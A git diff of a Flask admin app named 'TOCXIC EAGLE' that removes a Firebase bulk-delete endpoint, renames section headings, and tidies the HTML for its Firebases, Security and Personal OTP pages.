-    except Exception as e:
-        return jsonify({"success": False, "error": str(e)}), 500
-
 @app.route("/api/broadcasts/all", methods=["DELETE"])
 @admin_required
 def api_broadcast_delete_all():
@@ -2233,7 +2605,7 @@ def api_broadcast_delete_all():
         return jsonify({"success": False, "error": str(e)}), 500
 
 # ═══════════════════════════════════════════════════════════════
-# FIREBASES APIs
+# FIREBASES
 # ═══════════════════════════════════════════════════════════════
 @app.route("/api/firebases", methods=["GET"])
 @admin_required
@@ -2307,23 +2679,6 @@ def api_fb_delete(fb_id):
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 400
 
-@app.route("/api/firebases/bulk-delete", methods=["POST"])
-@admin_required
-def api_fb_bulk_delete():
-    init_mongo()
-    if not MONGO_OK: return jsonify({"success": False, "error": "MongoDB down"}), 500
-    data = request.get_json() or {}
-    ids = data.get("ids", [])
-    deleted = 0
-    for i in ids:
-        try:
-            res = fb_collection.delete_one({"_id": ObjectId(i)})
-            deleted += res.deleted_count
-        except Exception: pass
-    if not IS_SERVERLESS:
-        threading.Thread(target=refresh_cache, daemon=True).start()
-    return jsonify({"success": True, "deleted": deleted})
-
 @app.route("/api/firebases/all", methods=["DELETE"])
 @admin_required
 def api_fb_delete_all():
@@ -2356,7 +2711,7 @@ def api_security_change():
     return jsonify({"success": True}) if ok else (jsonify({"success": False, "error": "Save failed"}), 500)
 
 # ═══════════════════════════════════════════════════════════════
-# PERSONAL OTP API
+# PERSONAL OTP
 # ═══════════════════════════════════════════════════════════════
 @app.route("/api/otp/add", methods=["POST"])
 def api_otp_add():
@@ -2380,7 +2735,7 @@ def api_otp_add():
         return jsonify({"success": False, "error": str(e)}), 500
 
 # ═══════════════════════════════════════════════════════════════
-# FIREBASES / SECURITY / PERSONAL OTP PAGES
+# FIREBASES PAGE
 # ═══════════════════════════════════════════════════════════════
 FIREBASES_HTML = """<!DOCTYPE html>
 <html lang="en"><head><meta charset="UTF-8"><title>Firebases</title>
@@ -2412,7 +2767,6 @@ FIREBASES_HTML = """<!DOCTYPE html>
 .msg.ok{background:rgba(34,197,94,.15);color:#4ade80;display:block}
 .msg.err{background:rgba(228,0,0,.12);color:var(--red2);display:block}
 </style></head><body>
-
 <div class="topbar">
 <div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
 </div>
@@ -2422,7 +2776,6 @@ FIREBASES_HTML = """<!DOCTYPE html>
 <a href="/admin/security" class="nav-link">🔒 Security</a>
 <a href="/logout" class="nav-link">Logout</a>
 </div>
-
 <div class="container">
 <div class="card">
 <h3>➕ Add Firebase URL</h3>
@@ -2434,13 +2787,11 @@ FIREBASES_HTML = """<!DOCTYPE html>
 </div>
 <div id="fb-msg" class="msg"></div>
 </div>
-
 <div class="card">
 <h3>🔥 Registered Firebases <span id="fb-count" style="color:var(--text3);font-weight:600">(0)</span></h3>
 <div id="fb-list" class="fb-list"></div>
 </div>
 </div>
-
 <div id="toast"></div>
 <script>
 function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
@@ -2448,7 +2799,6 @@ e.classList.add('show'); setTimeout(()=>e.classList.remove('show'), 2200); }
 function showMsg(t, type){ const e = document.getElementById('fb-msg');
 e.className = 'msg ' + type; e.textContent = t;
 if(type === 'ok') setTimeout(()=>{ e.className = 'msg'; }, 3000); }
-
 async function addFirebase(){
   const url = document.getElementById('fb-url').value.trim();
   if(!url) return showMsg('URL required','err');
@@ -2460,7 +2810,6 @@ async function addFirebase(){
     else showMsg('❌ ' + (d.error||'Error'),'err');
   } catch(e){ showMsg('❌ Network error','err'); }
 }
-
 async function bulkAdd(){
   const txt = prompt('Paste URLs (one per line):');
   if(!txt) return;
@@ -2473,7 +2822,6 @@ async function bulkAdd(){
   if(d.success){ showMsg('✅ Added: ' + d.added + ' · Skip: ' + d.skipped,'ok'); loadFbs(); }
   else showMsg('❌ ' + (d.error||'Error'),'err');
 }
-
 async function loadFbs(){
   try {
     const r = await fetch('/api/firebases'); const d = await r.json();
@@ -2495,7 +2843,6 @@ async function loadFbs(){
       </div>`).join('');
   } catch(e){}
 }
-
 async function removeFb(id){
   if(!confirm('Delete this firebase?')) return;
   const r = await fetch('/api/firebases/' + id, { method:'DELETE' });
@@ -2537,7 +2884,6 @@ SECURITY_HTML = """<!DOCTYPE html>
 .msg.ok{background:rgba(34,197,94,.15);color:#4ade80;display:block}
 .msg.err{background:rgba(228,0,0,.12);color:var(--red2);display:block}
 </style></head><body>
-
 <div class="topbar">
 <div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
 </div>
@@ -2547,7 +2893,6 @@ SECURITY_HTML = """<!DOCTYPE html>
 <a href="/admin/security" class="nav-link active">🔒 Security</a>
 <a href="/logout" class="nav-link">Logout</a>
 </div>
-
 <div class="container">
 <div class="card">
 <h3>👑 Change Admin Password</h3>
@@ -2563,7 +2908,6 @@ SECURITY_HTML = """<!DOCTYPE html>
 <div class="msg" id="admin-msg"></div>
 </div>
 </div>
-
 <div id="toast"></div>
 <script>
 function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
@@ -2610,7 +2954,6 @@ PERSONAL_OTP_HTML = """<!DOCTYPE html>
 .msg.ok{background:rgba(34,197,94,.15);color:#4ade80;display:block}
 .msg.err{background:rgba(228,0,0,.12);color:var(--red2);display:block}
 </style></head><body>
-
 <div class="topbar">
 <div class="topbar-logo"><span class="eagle">🦅</span><span class="name">TOCXIC EAGLE</span></div>
 </div>
@@ -2619,7 +2962,6 @@ PERSONAL_OTP_HTML = """<!DOCTYPE html>
 <a href="/otp" class="nav-link green active">🔐 Personal OTP</a>
 <a href="/" class="nav-link">🏠 Home</a>
 </div>
-
 <div class="container">
 <div class="card">
 <h3>🔐 Add Your Own Firebase</h3>
@@ -2630,7 +2972,6 @@ PERSONAL_OTP_HTML = """<!DOCTYPE html>
 </div>
 <div id="msg" class="msg"></div>
 </div>
-
 <div class="card">
 <h3>ℹ️ How it works</h3>
 <div style="font-size:13px;color:var(--text2);line-height:1.7">
@@ -2642,7 +2983,6 @@ PERSONAL_OTP_HTML = """<!DOCTYPE html>
 </div>
 </div>
 </div>
-
 <div id="toast"></div>
 <script>
 function toast(t){ const e = document.getElementById('toast'); e.textContent = t;
@@ -2683,5 +3023,5 @@ else:
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
-    print(f"[✓] Starting TOCXIC EAGLE on 0.0.0.0:{port}")
+    print(f"[✓] Starting TOCXIC EAGLE v72 on 0.0.0.0:{port}")
     app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
